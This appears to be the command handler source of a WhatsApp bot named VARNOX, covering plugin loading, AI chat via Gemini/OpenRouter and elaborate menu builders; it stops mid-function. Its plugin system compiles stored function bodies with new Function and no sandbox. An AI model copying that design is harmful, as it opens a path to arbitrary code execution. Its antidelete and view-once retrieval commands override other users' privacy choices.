// ============================================================
//   case.js  v5  –  WhatsApp commands  (switch/case)
// ============================================================
'use strict';

const fs    = require('fs');
const path  = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const crypto = require('crypto');
const settings = require('./settings');
const { uploadToTelegraph } = require('./helper/uploader');
const { convertFont, formatUptime, getDateTime, normalizeJid, readJSON, writeJSON, ensureDir } = require('./helper/utils');
const { logMessage, logInfo, logError } = require('./helper/logger');
const {
  getWaSettings, setWaSetting,
  addPremium, removePremium, isPremium,
  storeMessage, retrieveMessage, numOf,
} = require('./helper/function');
const { normNum, getTargetJid, getGroupAdminInfo } = require('./helper/groupAdmin');
const { getGroupFlag, setGroupFlag } = require('./helper/listeners');
const { devHandler, DEV_CMDS }       = require('./dev-commands');
const { reactionHandler, REACTION_CMDS } = require('./helper/reactions');
const { scrapsHandler,  SCRAPS_CMDS }  = require('./scraps');
const { illusionHandler, ILLUSION_CMDS } = require('./illusion');
const { socialHandler,  SOCIAL_CMDS }  = require('./social');
const { aiHandler,      AI_CMDS }      = require('./ai');
const { economyHandler, ECON_CMDS }    = require('./economy');
const { toolsHandler,   TOOLS_CMDS }   = require('./tools');
const { stickerHandler, STICKER_CMDS } = require('./stickers');
const { musicHandler,   MUSIC_CMDS }   = require('./music');
const { gamesHandler,   GAMES_CMDS }   = require('./games');
const { adminHandler,   ADMIN_CMDS }   = require('./admin');
const { arabicHandler,  ARABIC_CMDS }  = require('./arabic');
const { getJuneCommand, executeJuneCommand, getJuneCommandsByCategory, getJuneLoadReport } = require('./june-compat/bridge');

let blacklordButtonsModule;
async function getBlacklordButtons() {
  if (!blacklordButtonsModule) blacklordButtonsModule = await import('blacklord-btns');
  return blacklordButtonsModule;
}

// Rotating VARNOX menu artwork. Files are kept local so the bot does not depend
// on an external image host, and each menu response advances to the next image.
const MENU_IMAGE_DIR = path.resolve(__dirname, 'menu-images');
let menuImageCursor = 0;
function getRotatingMenuImage(configuredImage = '') {
  try {
    const dirs = [MENU_IMAGE_DIR, __dirname];
    const localImages = dirs.flatMap(dir => {
      try {
        return fs.readdirSync(dir)
          .filter(name => /^(?:varnox-menu-)\d+\.(?:jpe?g|png|webp)$/i.test(name))
          .sort()
          .map(name => path.join(dir, name));
      } catch { return []; }
    });
    if (localImages.length) {
      const image = localImages[menuImageCursor % localImages.length];
      menuImageCursor = (menuImageCursor + 1) % localImages.length;
      return image;
    }
  } catch (error) {
    console.error('[VARNOX MENU] Rotating image scan failed:', error.message);
  }
  return configuredImage || '';
}

const DB = (...f) => path.resolve(__dirname, 'database', ...f);
ensureDir(path.resolve(__dirname, 'database'));

// ════════════════════════════════════════════════════════════
//   BLACKLORD CHAMBER PLUGIN SYSTEM
// ════════════════════════════════════════════════════════════
const pluginsFile = DB('plugins.json');
let pluginMap = new Map();
let pluginNames = [];

function loadPlugins() {
  pluginMap.clear();
  pluginNames = [];
  try {
    const data = readJSON(pluginsFile, []);
    for (const plugin of data) {
      try {
        const fn = new Function(
          'sock', 'm', 'args', 'reply', 'reaction', 'ft', 'cfg', 'dlMedia', 'getQuoted', 'normNum', 'getTargetJid',
          `return (${plugin.functionBody})`
        );
        pluginMap.set(plugin.name, fn);
        pluginNames.push(plugin.name);
      } catch (e) {
        console.error(`[BLACKLORD] Failed to load plugin "${plugin.name}":`, e);
      }
    }
    console.log(`[BLACKLORD] Loaded ${pluginNames.length} plugins.`);
  } catch (e) {
    console.error('[BLACKLORD] Failed to load plugins:', e);
  }
}

function savePlugin(plugin) {
  const data = readJSON(pluginsFile, []);
  if (data.find(p => p.name === plugin.name)) {
    throw new Error(`Plugin "${plugin.name}" already exists.`);
  }
  data.push(plugin);
  writeJSON(pluginsFile, data);
  return true;
}

function deletePlugin(name) {
  const data = readJSON(pluginsFile, []);
  const filtered = data.filter(p => p.name !== name);
  if (filtered.length === data.length) {
    throw new Error(`Plugin "${name}" not found.`);
  }
  writeJSON(pluginsFile, filtered);
  return true;
}

function addfunction(name, description, fn) {
  const functionBody = fn.toString();
  // Validate syntax by compiling
  try {
    const testFn = new Function('sock', 'm', 'args', 'reply', 'reaction', 'ft', 'cfg', 'dlMedia', 'getQuoted', 'normNum', 'getTargetJid', `return (${functionBody})`);
    if (typeof testFn !== 'function') throw new Error('Not a function');
  } catch (e) {
    throw new Error(`Invalid function: ${e.message}`);
  }
  const plugin = { name, description, functionBody, ownerOnly: true, createdAt: Date.now() };
  savePlugin(plugin);
  loadPlugins(); // reload in memory
  return true;
}

// Load plugins at startup
loadPlugins();

// ════════════════════════════════════════════════════════════
//   STICKER COMMANDS STORAGE
// ════════════════════════════════════════════════════════════
const stickerCmdsFile = path.join(__dirname, 'database', 'sticker_commands.json');

function getStickerCommands() {
    try {
        return JSON.parse(fs.readFileSync(stickerCmdsFile, 'utf8'));
    } catch {
        return {};
    }
}

function setStickerCommand(hash, command) {
    const data = getStickerCommands();
    if (!command) delete data[hash];
    else data[hash] = command;
    fs.writeFileSync(stickerCmdsFile, JSON.stringify(data, null, 2));
}

// ════════════════════════════════════════════════════════════
//   SHARED HELPERS
// ════════════════════════════════════════════════════════════

function cfg(sock) {
  const waNum = sock.__waNum || (sock.user?.id ? normNum(sock.user.id) : 'default');
  return getWaSettings(waNum);
}

function ft(txt, sock) { return convertFont(String(txt), cfg(sock).font || 0); }

function getQuoted(m) {
  const ctx = m.message?.extendedTextMessage?.contextInfo;
  if (!ctx?.quotedMessage) return { qMsg: null, qType: null, qKey: null };
  const qMsg  = ctx.quotedMessage;
  const qType = Object.keys(qMsg).find(k => !['senderKeyDistributionMessage','messageContextInfo'].includes(k));
  const qKey  = {
    remoteJid:   m.key.remoteJid,
    id:          ctx.stanzaId,
    fromMe:      false,
    participant: ctx.participant,
  };
  return { qMsg, qType, qKey };
}

async function dlMedia(msgObj, keyObj) {
  const { downloadMediaMessage } = require('blacklord-socket');
  return downloadMediaMessage(
    { message: msgObj, key: keyObj }, 'buffer', {},
    { logger: { info(){}, error(){}, warn(){}, debug(){}, child(){ return this; } } }
  );
}

async function getBuffer(url) {
  const res = await axios.get(url, { responseType: 'arraybuffer', timeout: 15000 });
  return Buffer.from(res.data);
}

async function runAutoFollow(sock) {
  for (const nl of (settings.AUTO_FOLLOW_NEWSLETTERS || [])) {
    try { await sock.newsletterFollow(nl); } catch (e) { process.stdout.write('[autofollow] ' + nl + ' => ' + e.message + '\n'); }
  }
  for (const link of (settings.AUTO_JOIN_GROUPS || [])) {
    try {
      const code = link.split('chat.whatsapp.com/')[1];
      if (code) await sock.groupAcceptInvite(code);
    } catch (e) { process.stdout.write('[autojoin] ' + link + ' => ' + e.message + '\n'); }
  }
}

// ════════════════════════════════════════════════════════════
//   CHATBOT STORAGE & AI HELPER
// ════════════════════════════════════════════════════════════
const chatbotFile = DB('chatbot.json');

function getChatbotSettings(jid) {
  const data = readJSON(chatbotFile, {});
  return data[jid] || { enabled: false, systemPrompt: '' };
}

function setChatbotSettings(jid, settings) {
  const data = readJSON(chatbotFile, {});
  data[jid] = settings;
  writeJSON(chatbotFile, data);
}

async function getAIResponse(prompt, systemPrompt = '') {
  // Option A: Google Gemini
  const GEMINI_KEY = settings.GEMINI_API_KEY || '';
  if (GEMINI_KEY) {
    const payload = {
      contents: [{ parts: [{ text: prompt }] }],
    };
    if (systemPrompt) {
      payload.systemInstruction = { parts: [{ text: systemPrompt }] };
    }
    const { data } = await axios.post(
      `https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=${GEMINI_KEY}`,
      payload,
      { timeout: 30000 }
    );
    return data.candidates?.[0]?.content?.parts?.[0]?.text || 'No response.';
  }

  // Option B: OpenRouter (free models)
  const OPENROUTER_KEY = settings.OPENROUTER_API_KEY || '';
  if (OPENROUTER_KEY) {
    const messages = [];
    if (systemPrompt) messages.push({ role: 'system', content: systemPrompt });
    messages.push({ role: 'user', content: prompt });
    const { data } = await axios.post(
      'https://openrouter.ai/api/v1/chat/completions',
      {
        model: 'mistralai/mistral-7b-instruct:free',
        messages,
      },
      {
        headers: {
          Authorization: `Bearer ${OPENROUTER_KEY}`,
          'Content-Type': 'application/json',
        },
        timeout: 30000,
      }
    );
    return data.choices?.[0]?.message?.content || 'No response.';
  }

  throw new Error('No AI API key configured. Set GEMINI_API_KEY or OPENROUTER_API_KEY in settings.js');
}

// ── Command list for dynamic menu ──────────────────────────────
const CMDS = {
  Owner:     ['setsticker','prefixfree','setprefix','setowner','setbotname','setmenuimg','setbotimg','setfonts','public','self','addprem','delprem','antidelete','iphonemode','autoviewstatus','autolikestatus','anticall','block','unblock','listblocked','broadcast','pair'],
  Group:     ['promote','demote','kick','mute','unmute','tagall','tagadmins','grouplink','revoke','groupinfo','setgname','setgdesc','hidetag','warn','resetwarn','warnings','antilink','antimedia','welcome','goodbye','lock','unlock','everyone','admins','listgroups','members','approveall','rejectall','checkpending','disap','antimention','antispam','antibot','slowmode','endpoll','setwelcomemsg','setgoodbyemsg','kickinactive','mutelist','softban','kickall'],
  Utility:   ['sticker','toimg','vv','qr','weather','tr','uploadstatus','setmypp','getpp','tts','tourl','ocr','shorten','friends','play','playdoc','idch','lyrics','imagine','carbon','instagram','tiktok','facebook','twitter','pinterest','spotify','ytmp4','base64','unbase64','whois','reversegif','attp','emojimix'],
  Fun:       ['joke','fact','quote','dare','truth','riddle','roast','ship','coinflip','dice','magic8','horoscope','meme','cat','dog','waifu','anime','trivia','compliment','bored','rps','math','typeracer','neverhaveiever','wouldyourather'],
  Reactions: REACTION_CMDS,
  Admin:     ADMIN_CMDS,
  Illusion:  ILLUSION_CMDS,
  Social:    SOCIAL_CMDS,
  AI:        AI_CMDS,
  Tools:     TOOLS_CMDS,
  Stickers:  STICKER_CMDS,
  Music:     MUSIC_CMDS,
};

// ── VARNOX button-driven menu taxonomy ────────────────────────
// The labels follow the requested menu layout. Where this build has no
// matching command module, the category remains visible and reports empty.
const MENU_CATEGORY_DEFINITIONS = [
  { key: 'adminmenu',        title: '𝐀𝐃𝐌𝐈𝐍 𝐌𝐄𝐍𝐔',             commands: () => ADMIN_CMDS },
  { key: 'aimenu',           title: '𝐀𝐈 𝐌𝐄𝐍𝐔',                commands: () => AI_CMDS },
  { key: 'aivideomenu',      title: '𝐀𝐈 𝐕𝐈𝐃𝐄𝐎 𝐌𝐄𝐍𝐔',         commands: () => [] },
  { key: 'animemenu',        title: '𝐀𝐍𝐈𝐌𝐄 𝐌𝐄𝐍𝐔',             commands: () => SCRAPS_CMDS.filter(x => /anime|manga/i.test(x)) },
  { key: 'buypanelmenu',     title: '𝐁𝐔𝐘 𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔',        commands: () => [] },
  { key: 'convertmenu',      title: '𝐂𝐎𝐍𝐕𝐄𝐑𝐓 𝐌𝐄𝐍𝐔',          commands: () => TOOLS_CMDS.filter(x => /convert|base64|unbase64/i.test(x)) },
  { key: 'designmenu',       title: '𝐃𝐄𝐒𝐈𝐆𝐍 𝐌𝐄𝐍𝐔',           commands: () => ILLUSION_CMDS },
  { key: 'encryptionmenu',   title: '𝐄𝐍𝐂𝐑𝐘𝐏𝐓𝐈𝐎𝐍 𝐌𝐄𝐍𝐔',      commands: () => DEV_CMDS.filter(x => /^(enc|dec)/i.test(x)) },
  { key: 'extramenu',        title: '𝐄𝐗𝐓𝐑𝐀 𝐌𝐄𝐍𝐔',             commands: () => CMDS.Utility.filter(x => /whois|reverse|shorten|barcode|vcard/i.test(x)) },
  { key: 'funmenu',          title: '𝐅𝐔𝐍 𝐌𝐄𝐍𝐔',                commands: () => CMDS.Fun },
  { key: 'generalmenu',      title: '𝐆𝐄𝐍𝐄𝐑𝐀𝐋 𝐌𝐄𝐍𝐔',            commands: () => ['menu', 'allmenu', 'categories', 'owner', 'ping', 'speed', 'uptime', 'alive'] },
  { key: 'groupmenu',        title: '𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔',              commands: () => CMDS.Group },
  { key: 'illusionmenu',     title: '𝐈𝐋𝐋𝐔𝐒𝐈𝐎𝐍 𝐌𝐄𝐍𝐔',           commands: () => ILLUSION_CMDS },
  { key: 'installmenu',      title: '𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐌𝐄𝐍𝐔',            commands: () => ['addplugin', 'plugins', 'delplugin'] },
  { key: 'makermenu',        title: '𝐌𝐀𝐊𝐄𝐑 𝐌𝐄𝐍𝐔',              commands: () => CMDS.Utility.filter(x => /carbon|attp|emojimix|qr/i.test(x)) },
  { key: 'mediamenu',        title: '𝐌𝐄𝐃𝐈𝐀 𝐌𝐄𝐍𝐔',              commands: () => [...new Set([...CMDS.Utility.filter(x => /sticker|toimg|vv/i.test(x)), ...STICKER_CMDS]) ] },
  { key: 'moviesmenu',       title: '𝐌𝐎𝐕𝐈𝐄𝐒 𝐌𝐄𝐍𝐔',             commands: () => SCRAPS_CMDS.filter(x => /movie/i.test(x)) },
  { key: 'newsmenu',         title: '𝐍𝐄𝐖𝐒 𝐌𝐄𝐍𝐔',               commands: () => [] },
  { key: 'othermenu',        title: '𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔',              commands: () => ['prefixfree', 'setprefix', 'setfonts'] },
  { key: 'ownermenu',        title: '𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔',              commands: () => CMDS.Owner },
  { key: 'randomimagemenu',  title: '𝐑𝐀𝐍𝐃𝐎𝐌 𝐈𝐌𝐀𝐆𝐄 𝐌𝐄𝐍𝐔',     commands: () => CMDS.Fun.filter(x => /meme|cat|dog|waifu|anime/i.test(x)) },
  { key: 'reactionsmenu',    title: '𝐑𝐄𝐀𝐂𝐓𝐈𝐎𝐍𝐒 𝐌𝐄𝐍𝐔',        commands: () => REACTION_CMDS },
  { key: 'religionmenu',     title: '𝐑𝐄𝐋𝐈𝐆𝐄𝐎𝐍 𝐌𝐄𝐍𝐔',          commands: () => ARABIC_CMDS.filter(x => /quran|hadith|dua|prayer|qibla|hijri|islamic|asma|nasheed|tafsir/i.test(x)) },
  { key: 'searchmenu',       title: '𝐒𝐄𝐀𝐑𝐂𝐇 𝐌𝐄𝐍𝐔',             commands: () => ['play', 'lyrics', 'friends', 'whois', 'instagram', 'tiktok', 'facebook', 'twitter', 'pinterest', 'spotify'] },
  { key: 'stickersmenu',     title: '𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐒 𝐌𝐄𝐍𝐔',           commands: () => STICKER_CMDS },
  { key: 'sportsmenu',       title: '𝐒𝐏𝐎𝐑𝐓𝐒 𝐌𝐄𝐍𝐔',             commands: () => [] },
  { key: 'socialmenu',       title: '𝐒𝐎𝐂𝐈𝐀𝐋 𝐌𝐄𝐍𝐔',              commands: () => SOCIAL_CMDS },
  { key: 'stalkmenu',        title: '𝐒𝐓𝐀𝐋𝐊 𝐌𝐄𝐍𝐔',               commands: () => [] },
  { key: 'styletransfermenu',title: '𝐒𝐓𝐘𝐋𝐄 𝐓𝐑𝐀𝐍𝐒𝐅𝐄𝐑 𝐌𝐄𝐍𝐔', commands: () => TOOLS_CMDS.filter(x => /font/i.test(x)) },
  { key: 'telegrammenu',     title: '𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐌𝐄𝐍𝐔',          commands: () => ['tgstickers', 'tgsticker', 'telegramsticker'] },
  { key: 'textmakermenu',    title: '𝐓𝐄𝐗𝐓 𝐌𝐀𝐊𝐄𝐑 𝐌𝐄𝐍𝐔',        commands: () => [...new Set([...AI_CMDS.filter(x => /caption|slogan|bio|poem|story/i.test(x)), ...CMDS.Fun.filter(x => /quote|joke|fact/i.test(x)), ...STICKER_CMDS.filter(x => /text/i.test(x))]) ] },
  { key: 'musicmenu',        title: '𝐌𝐔𝐒𝐈𝐂 𝐌𝐄𝐍𝐔',              commands: () => MUSIC_CMDS },
  { key: 'toolsmenu',        title: '𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔',              commands: () => TOOLS_CMDS },
  { key: 'utilitymenu',      title: '𝐔𝐓𝐈𝐋𝐈𝐓𝐘 𝐌𝐄𝐍𝐔',            commands: () => CMDS.Utility },
];

const MENU_CATEGORY_MAP = new Map(MENU_CATEGORY_DEFINITIONS.map(category => [category.key, category]));

const JUNE_MENU_CATEGORY_SOURCES = {
  adminmenu: ['admin'], aimenu: ['ai'], aivideomenu: ['aivideo'], animemenu: ['anime'],
  convertmenu: ['convert'], designmenu: ['design'], funmenu: ['fun'], generalmenu: ['general'],
  groupmenu: ['admin'], illusionmenu: [], installmenu: [], makermenu: ['design', 'textmaker'],
  mediamenu: ['media'], moviesmenu: ['movies'], newsmenu: [], othermenu: ['general', 'owner'],
  ownermenu: ['owner'], randomimagemenu: ['fun'], reactionsmenu: [], religionmenu: ['religeon'],
  searchmenu: ['general', 'media', 'tools'], stickersmenu: [], sportsmenu: ['sports'],
  socialmenu: [], stalkmenu: ['general'], styletransfermenu: ['design', 'textmaker'],
  telegrammenu: [], textmakermenu: ['textmaker'], musicmenu: ['media'], toolsmenu: ['tools'],
  utilitymenu: ['utility'],
};

function getMenuCategoryCommands(category) {
  try {
    const base = (category?.commands?.() || []).filter(Boolean).map(String);
    const juneSources = JUNE_MENU_CATEGORY_SOURCES[category?.key] || [];
    const june = juneSources.flatMap(source => getJuneCommandsByCategory(source));
    return [...new Set([...base, ...june].map(String).map(command => command.toLowerCase()))];
  } catch (error) {
    console.error(`[VARNOX MENU] Failed to build ${category?.key || 'unknown'}:`, error.message);
    return [];
  }
}

function buildCategoryIndexText() {
  return MENU_CATEGORY_DEFINITIONS
    .map((category, index) => `> ${String(index + 1).padStart(2, '0')} • ${category.title}`)
    .join('\n');
}

function buildCategoryRows(prefix) {
  return MENU_CATEGORY_DEFINITIONS.map(category => ({
    title: category.title,
    description: `${getMenuCategoryCommands(category).length} commands — open menu`,
    id: `${prefix}cat_${category.key}`,
  }));
}

function chunkMenuRows(rows, size = 10) {
  const chunks = [];
  for (let index = 0; index < rows.length; index += size) chunks.push(rows.slice(index, index + size));
  return chunks;
}

function buildCategorySections(prefix) {
  return chunkMenuRows(buildCategoryRows(prefix)).map((rows, index) => ({
    title: `Categories ${index * 10 + 1}-${index * 10 + rows.length}`,
    rows,
  }));
}

function buildVarnoXPillButtons(btn, prefix, entries) {
  return entries.map(({ label, command }) =>
    btn.reply(`_*~${label}~*_`, `${prefix}${command}`)
  );
}

function buildVarnoXMainPillButtons(btn, prefix, website) {
  return [
    ...buildVarnoXPillButtons(btn, prefix, [
      { label: '𝐎𝐖𝐍𝐄𝐑', command: 'ownermenu' },
      { label: '𝐀𝐈', command: 'aimenu' },
      { label: '𝐆𝐑𝐎𝐔𝐏', command: 'groupmenu' },
      { label: '𝐃𝐄𝐒𝐈𝐆𝐍', command: 'designmenu' },
      { label: '𝐌𝐄𝐃𝐈𝐀', command: 'mediamenu' },
      { label: '𝐅𝐔𝐍', command: 'funmenu' },
      { label: '𝐌𝐔𝐒𝐈𝐂', command: 'musicmenu' },
      { label: '𝐓𝐎𝐎𝐋𝐒', command: 'toolsmenu' },
    ]),
    btn.reply('_*~𝐀𝐋𝐋 𝐌𝐄𝐍𝐔~*_', `${prefix}allmenu_part1`),
    btn.list('_*~𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒~*_', buildCategorySections(prefix)),
    btn.url('_*~𝐕𝐈𝐒𝐈𝐓 𝐖𝐄𝐁𝐒𝐈𝐓𝐄~*_', website),
  ];
}

function buildVarnoXCategoryPillButtons(btn, prefix, commands, website) {
  const shortCommands = [...new Set((commands || []).map(command => String(command).toLowerCase()))].slice(0, 12);
  return [
    ...buildVarnoXPillButtons(btn, prefix, shortCommands.map(command => ({
      label: command.toUpperCase(),
      command,
    }))),
    btn.list('_*~𝐎𝐏𝐄𝐍 𝐀𝐋𝐋 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒~*_', buildCommandSections(prefix, commands, 'Commands')),
    btn.reply('_*~𝐀𝐋𝐋 𝐌𝐄𝐍𝐔~*_', `${prefix}allmenu_part1`),
    btn.list('_*~𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒~*_', buildCategorySections(prefix)),
    btn.url('_*~𝐖𝐄𝐁𝐒𝐈𝐓𝐄~*_', website),
  ];
}

function parseVarnoXMenuVariant(command) {
  let value = String(command || '').toLowerCase().trim();
  let format = null;
  const suffix = value.match(/^(.*?)[_-](raw|text|native|pill|buttons|fast)$/i);
  if (suffix) {
    value = suffix[1];
    format = ['raw', 'text'].includes(suffix[2].toLowerCase()) ? 'raw' : 'native';
  }
  const aliases = {
    menufast: 'menu',
    menupill: 'menu',
    menubuttons: 'menu',
    menuinteractive: 'menu',
    menuraw: 'menu',
    menutext: 'menu',
    rawmenu: 'menu',
  };
  if (aliases[value]) {
    if (!format) format = ['menuraw', 'menutext', 'rawmenu'].includes(value) ? 'raw' : 'native';
    value = aliases[value];
  }
  return { command: value, format };
}

function resolveVarnoXMenuFormat(config, override) {
  if (override) return override;
  const configured = String(config?.menuFormat || config?.menuMode || '').toLowerCase().trim();
  if (['raw', 'text', 'legacy', 'plain'].includes(configured)) return 'raw';
  return 'native';
}

async function sendVarnoXRawMenu(sock, jid, options = {}) {
  const text = String(options.text || '');
  const quoted = options.quoted;
  let imageBuffer;
  if (options.imageUrl) {
    try {
      if (options.imageUrl.startsWith('data:')) {
        const encoded = options.imageUrl.split(',')[1];
        if (encoded) imageBuffer = Buffer.from(encoded, 'base64');
      } else if (options.imageUrl.startsWith('http')) {
        const response = await axios.get(options.imageUrl, { responseType: 'arraybuffer', timeout: 12000 });
        imageBuffer = Buffer.from(response.data);
      } else {
        imageBuffer = fs.readFileSync(options.imageUrl);
      }
    } catch (error) {
      console.error('[VARNOX MENU] Raw artwork preparation failed:', error.message);
    }
  }
  const contextInfo = options.contextInfo || {};
  if (imageBuffer && imageBuffer.length > 200) {
    return sock.sendMessage(jid, { image: imageBuffer, caption: text, contextInfo }, { quoted });
  }
  return sock.sendMessage(jid, { text, contextInfo }, { quoted });
}

function isVarnoXMenuCommand(command) {
  return command === 'menu' || command === 'allmenu' || /^allmenu_part[123]$/.test(command) || command === 'categories' || command === 'ownermenu' || command.startsWith('cat_') || MENU_CATEGORY_MAP.has(command);
}

function buildCommandSections(prefix, commands, title = 'Commands') {
  const rows = buildCommandRows(prefix, commands);
  return chunkMenuRows(rows).map((sectionRows, index) => ({
    title: `${title} ${index + 1}`,
    rows: sectionRows,
  }));
}

function buildCommandRows(prefix, commands) {
  const rows = getMenuCategoryCommands({ commands: () => commands }).map(command => ({
    title: `${prefix}${command}`,
    description: `Run ${command}`,
    id: `${prefix}${command}`,
  }));
  return rows.length ? rows : [{
    title: 'No commands installed',
    description: 'Return to the category list',
    id: `${prefix}categories`,
  }];
}

function buildVarnoXCategoryMenuText(category, commands, prefix, label = category?.title || 'COMMAND MENU', status = {}) {
  const title = String(label).toUpperCase();
  const statusLines = buildVarnoXAllMenuStatus(status)
    .split('\n')
    .map(line => line ? `> ${line}` : '>');
  const lines = [
    ...statusLines,
    '>',
    `> │ ╭═━⪩ 〖${title}〗══━⩵꙰ཱི࿐`,
  ];
  for (const command of commands || []) lines.push(`> │ ${prefix}${String(command).toLowerCase()}`);
  lines.push('> │ ╰━ ━ ━ ━ ━ ━   ━•⩵꙰ཱི࿐');
  return lines.join('\n');
}

function getAllCommandLines(prefix) {
  const categoryFor = key => MENU_CATEGORY_MAP.get(`${key}menu`);
  const groups = [
    ['general', categoryFor('general') ? getMenuCategoryCommands(categoryFor('general')) : []],
    ['owner', categoryFor('owner') ? getMenuCategoryCommands(categoryFor('owner')) : []],
    ['group', categoryFor('group') ? getMenuCategoryCommands(categoryFor('group')) : []],
    ['utility', categoryFor('utility') ? getMenuCategoryCommands(categoryFor('utility')) : []],
    ['fun', categoryFor('fun') ? getMenuCategoryCommands(categoryFor('fun')) : []],
    ['reactions', CMDS.Reactions],
    ['admin', categoryFor('admin') ? getMenuCategoryCommands(categoryFor('admin')) : []],
    ['illusion', CMDS.Illusion],
    ['social', CMDS.Social],
    ['ai', categoryFor('ai') ? getMenuCategoryCommands(categoryFor('ai')) : []],
    ['tools', categoryFor('tools') ? getMenuCategoryCommands(categoryFor('tools')) : []],
    ['stickers', CMDS.Stickers],
    ['music', categoryFor('music') ? getMenuCategoryCommands(categoryFor('music')) : []],
  ].filter(([, commands]) => Array.isArray(commands) && commands.length);

  const lines = [];
  for (const [category, commands] of groups) {
    lines.push(`> │ ╭═━⪩ 〖${category.toUpperCase()} MENU〗══━⩵꙰ཱི࿐`);
    for (const command of commands) lines.push(`> │ ${prefix}${String(command).toLowerCase()}`);
    lines.push('> │ ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐', '');
  }
  return lines;
}

function buildAllCommandParts(prefix, totalParts = 3) {
  const lines = getAllCommandLines(prefix);
  const partSize = Math.ceil(lines.length / totalParts);
  return Array.from({ length: totalParts }, (_, index) =>
    lines.slice(index * partSize, (index + 1) * partSize).join('\n').trim()
  );
}

function buildAllCommandText(prefix, part = 1) {
  const parts = buildAllCommandParts(prefix, 3);
  return parts[Math.max(0, Math.min(2, Number(part) - 1))];
}

function buildVarnoXAllMenuStatus({ botName, mode, uptime, totalTools, prefix }) {
  return [
    '_*~𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐔𝐋𝐓𝐑𝐀~*_',
    '',
    '│ ╭═━⪩ 〘 𝑶𝑵𝑬 𝑼𝑰 𝑺𝑻𝑨𝑻𝑼𝑺 〙│━│⩵꙰ཱི࿐',
    `│ │⫹⫺ 𝗩𝗔𝗥𝗡𝗢𝗫 𝗫 𝗠𝗗: ${botName} 🟢`,
    '│ │⫹⫺ 𝗢𝗡𝗘 𝗕𝗨𝗜𝗟𝗗: 1.0.0',
    `│ │⫹⫺ 𝗗𝗘𝗩𝗜𝗖𝗘 𝗠𝗢𝗗𝗘: ${mode}`,
    `│ │⫹⫺ 𝗦𝗖𝗥𝗘𝗡 𝗧𝗜𝗠𝗘: ${uptime}`,
    `│ │⫹⫺ 𝗔𝗜 𝗧𝗢𝗢𝗟𝗦: ${totalTools}`,
    `│ │⫹⫺ 𝗤𝗨𝗜𝗖𝗞 𝗞𝗘𝗬: ${prefix}`,
    '│ │⫹⫺ 𝗩𝗔𝗥𝗡𝗢𝗫 𝗡𝗘𝗧𝗪𝗢𝗥: Incorporative',
    '│ ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━│⩵꙰ཱི࿐',
  ].join('\n');
}

function buildVarnoXMainMenuText({ botName, mode, uptime, totalTools, prefix }) {
  const categoryLines = MENU_CATEGORY_DEFINITIONS
    .map((category, index) => `║ ║ ❍ ${String(index + 1).padStart(2, '0')} • ${category.key.toUpperCase()}`);

  return [
    '╔═══════════════════════╗',
    '║ 〘 🟢 𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐌𝐃 🟢 〙',
    '╠═══════════════════════╝',
    '║ ╔══════════════════════╗',
    '║ ║   『 𝗦𝗬𝗦𝗧𝗘𝗠 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 』',
    '║ ╠══════════════════════╝',
    `║ ║ ⚝ 𝗕𝗢𝗧: 〘 🟢 ${botName} 🟢 〙`,
    '║ ║ ⚝ 𝗗𝗘𝗩: ⃝⃪ 𝐕𝐀𝐑𝐍𝐎𝐗  ⃝⃪',
    '║ ║ ⚝ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡: 𝐕𝐈𝐒𝐈𝐎𝐍 𝟐.𝟎',
    `║ ║ ⚝ 𝗠𝗢𝗗𝗘: ${mode}`,
    '║ ║ ⚝ 𝗣𝗟𝗔𝗧𝗙𝗢𝗥𝗠: linux',
    `║ ║ ⚝ 𝗨𝗣𝗧𝗜𝗠𝗘: ${uptime}`,
    '║ ║ ⚝ 𝗢𝗪𝗡𝗘𝗥: ⃝⃪ 𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐓𝐄𝐂𝐇 𝐈𝐍𝐂  ⃝⃪',
    '║ ╚══════════════════════╗',
    '║ ╔══════════════════════╝',
    '║ ║   『 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗖𝗔𝗧𝗘𝗚𝗢𝗥𝗜𝗘𝗦 』',
    '║ ╠══════════════════════╝',
    ...categoryLines,
    '║ ╠══════════════════════╗',
    '║ ║   『 𝗛𝗢𝗪 𝗧𝗢 𝗨𝗦𝗘 』',
    '║ ╠══════════════════════╝',
    `║ ║ ❍ Type ${prefix}allmenu for full command list (3 parts)`,
    `║ ║ ❍ Type ${prefix}<category name or number> to see its commands`,
    `║ ║ ❍ Example: ${prefix}aimenu or ${prefix}02`,
    '║ ╠══════════════════════╗',
    '║ ╔══════════════════════╝',
    '║ ║ 𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐓𝐄𝐂𝐇 𝐈𝐍𝐂',
    '║ ╠══════════════════════╝',
    '║ ║ ✞ 𝑨𝑰 𝑷𝑶𝑾𝑬𝑹𝑬𝑫',
    '║ ║ ✞ 𝑺𝑻𝑰𝑪𝑲𝑬𝑹𝑺 & 𝑫𝑶𝑾𝑵𝑳𝑶𝑨𝑫𝑺',
    '║ ║ ✞ 𝑨𝑫𝑴𝑰𝑵 𝑻𝑶𝑶𝑳𝑺',
    '║ ║ ✞ 𝟐𝟒/𝟕 𝑼𝑷𝑻𝑰𝑴𝑬',
    `║ ╚══════════════════════╝`,
    '║  ❍ 𝐕𝐀𝐑𝐍𝐎𝐗 𝐗 𝐌𝐃 ❍',
    '╚════════════════════════╝',
  ].join('\n');
}

async function sendVarnoXInteractiveMenu(sock, jid, options = {}) {
  const { btn } = await getBlacklordButtons();
